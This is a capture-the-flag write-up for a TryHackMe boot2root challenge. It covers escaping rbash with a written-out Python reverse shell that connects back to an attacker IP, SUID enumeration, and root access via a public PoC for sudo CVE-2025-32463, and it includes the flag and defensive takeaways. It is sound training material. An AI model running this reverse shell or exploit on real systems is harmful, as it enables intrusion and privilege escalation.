+++
title = 'SantaShield Part 3'
categories = ['Boot2Root']
date = "2025-12-16T10:30:00+01:00"
scrollToTop = true
+++

## Challenge Name:

SantaShield Part 3

## Category:

Boot2Root

## Challenge Description:

Vigtignissen fører sig frem med sit nye nissekonsulenthus SantaShield Security, men mon han har nisset i det, eller er der mon styr på sagerne?

https://tryhackme.com/jr/santashieldsecurity2o25

Continuing from [SantaShield Part 2](../santashield_2/index.md), we now have access as the `admin` user. However, we quickly discover we're trapped in a **restricted bash (rbash) shell**, severely limiting our command execution and path manipulation. Our goal: break out of the rbash jail, enumerate the system for privilege escalation vectors, and ultimately gain root access to capture the final flag.

## Approach

### Understanding the Restricted Shell

Upon logging in as `admin` via SSH, we immediately encounter a **restricted bash (rbash)** environment. Key limitations include:
- **PATH cannot be modified** - prevents direct access to standard binaries
- **Directory changes blocked** - `cd` commands fail or are restricted
- **Command redirection restricted** - `>`, `>>`, `<` may be blocked
- **Executable access limited** - only binaries in predefined paths are available

These restrictions prevent traditional privilege escalation enumeration and exploitation.

### Escaping rbash: Reverse Shell Approach

To break free, we leverage a reverse shell through an available interpreter. The `runner` command (or similar wrapper) allows us to execute Python, which we can use to spawn an unrestricted shell.

**Step 1: Set up listener on attacking machine**

```bash
nc -lvnp 1337
```

**Step 2: Execute Python reverse shell from victim**

```bash
runner -c "/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.162.204\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" < /dev/null
```

This payload:
1. Creates a socket connection back to our attacker machine (`192.168.162.204:1337`)
2. Duplicates file descriptors to redirect stdin/stdout/stderr through the socket
3. Spawns a PTY-controlled bash shell via `pty.spawn()`, bypassing rbash restrictions

**Step 3: Establish unrestricted environment**

Once connected, we restore a functional shell environment:

```bash
# Create symlink to get access to bash!
/usr/bin/ln -s /bin/bash /usr/bin/user/bash

# Execute bash
bash

# Export full PATH to access all system binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now we have a fully functional shell with unrestricted access to the filesystem and commands.

### Privilege Escalation: SUID Enumeration

With a functional shell, we systematically search for **SUID binaries**—executables with the setuid bit that run with their owner's privileges:

```bash
find / -type f -perm /4000 2>/dev/null
```

Key findings:
```
/usr/local/bin/sudo
/usr/local/bin/restart_admin
```

The `restart_admin` binary initially appears promising, given its presence in earlier challenges. However, extensive analysis reveals it's another **red herring**—testing from both `admin` and `user` contexts yields no exploitable path.

### Vulnerability Discovery: CVE-2025-32463

Shifting focus to `/usr/local/bin/sudo`, we check the version:

```bash
/usr/local/bin/sudo --version
Sudo version 1.9.17
```

Sudo versions **1.9.14 through 1.9.17** are vulnerable to [CVE-2025-32463](https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw), a **critical chroot-based privilege escalation flaw**.

**Vulnerability Summary:**
- The flaw allows an attacker to escape chroot environments by manipulating sudo's internal state
- Sudo incorrectly handles privilege transitions when invoked within restricted environments
- Exploitation grants full root shell access without requiring credentials

### Exploitation: sudo-chwoot.sh

We leverage a public proof-of-concept from [pr0v3rbs/CVE-2025-32463_chwoot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main).

The exploit script (`sudo-chwoot.sh`) automates the attack by:
1. Creating a temporary chroot environment
2. Invoking sudo with crafted arguments that trigger the privilege escalation bug
3. Breaking out of chroot and elevating to root

**Execution:**

```bash
bash sudo-chwoot.sh
```

The script immediately spawns a **root shell**:

```bash
root@debian:~$ id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1000(user)

root@debian:~$ cat /root/flag.txt
NC3{flag3:m3RRY_R007-R007!_4ND_xM4s}
```
Note the `R007-R007`part of the flag being a nice little reference to `sudo -R woot woot` from the PoC instructions!

Root access achieved—challenge complete!

## Flag

```text
NC3{flag3:m3RRY_R007-R007!_4ND_xM4s}
```

## Reflections and Learnings

- **Rbash escapes require creativity**: Restricted shells can often be bypassed via interpreters (Python, Perl, Awk) or commands that allow arbitrary execution. Testing available binaries and their command-line options is essential.
- **Reverse shells restore control**: When direct shell modification is blocked, establishing a reverse shell through network-capable interpreters bypasses many restrictions and provides a clean environment.
- **SUID enumeration is fundamental**: Automated tools like `find` for SUID binaries, combined with version checks, quickly surface privilege escalation vectors. Always verify versions against known CVEs.
- **Dead ends teach patience**: Both `restart_admin` (in Part 2 and Part 3) served as distractions. Not every discovery leads to exploitation—validate hypotheses quickly and move on when blocked.
- **CVE research accelerates exploitation**: Recognizing that sudo 1.9.14-1.9.17 is vulnerable to CVE-2025-32463 turned hours of manual testing into minutes with a PoC. Maintain awareness of recent disclosures and public exploits.
- **Chaining techniques is key**: This challenge required (1) rbash escape, (2) environment restoration, (3) SUID enumeration, (4) version fingerprinting, and (5) CVE exploitation—each step built on the last.

### Defensive Takeaways

- **Rbash is insufficient for security**: Restricted shells provide a thin layer of protection. Dedicated sandboxing (containers, AppArmor, SELinux) is far more effective.
- **Patch sudo immediately**: CVE-2025-32463 is critical. Upgrade to sudo 1.9.18+ or apply vendor patches urgently.
- **Audit SUID binaries**: Minimize the number of SUID executables on production systems. Custom SUID binaries (`restart_admin`) increase attack surface without clear benefit.
- **Monitor reverse shell activity**: Outbound connections from user accounts to uncommon ports should trigger alerts. Network segmentation and egress filtering limit post-compromise lateral movement.
- **Environment hardening**: Disable unnecessary interpreters in restricted contexts. If Python/Perl must exist, use mandatory access controls to prevent execution of untrusted code.

### Next Steps for Future Challenges

- Script common rbash escape techniques into a reusable toolkit for faster breakouts.
- Maintain a curated CVE database for privilege escalation vulnerabilities in common services (sudo, polkit, kernel).
- Practice exploiting chroot escapes and namespace manipulation to understand containerization weaknesses.